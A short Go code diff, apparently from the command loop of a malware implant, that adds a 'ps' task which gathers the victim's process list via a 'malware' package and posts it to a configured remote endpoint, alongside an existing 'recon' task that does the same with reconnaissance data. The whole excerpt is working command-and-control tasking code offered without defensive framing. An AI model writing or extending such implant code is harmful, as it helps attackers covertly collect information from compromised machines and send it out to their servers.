@@ -45,13 +45,23 @@ func main() {
 		}
 		switch t.Tag {
 		case "recon":
-			//r, err := malware.DoMiniRecon(key)
 			r, err := malware.DoRecon(key)
 			if err != nil {
 				fmt.Println(err)
 				return
 			}
 			_, err = malware.PostRequest(r, config.PostEndpoint, *config)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+		case "ps":
+			ps, err := malware.GetProcessList(key)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+			_, err = malware.PostRequest(ps, config.PostEndpoint, *config)
 			if err != nil {
 				fmt.Println(err)
 				return
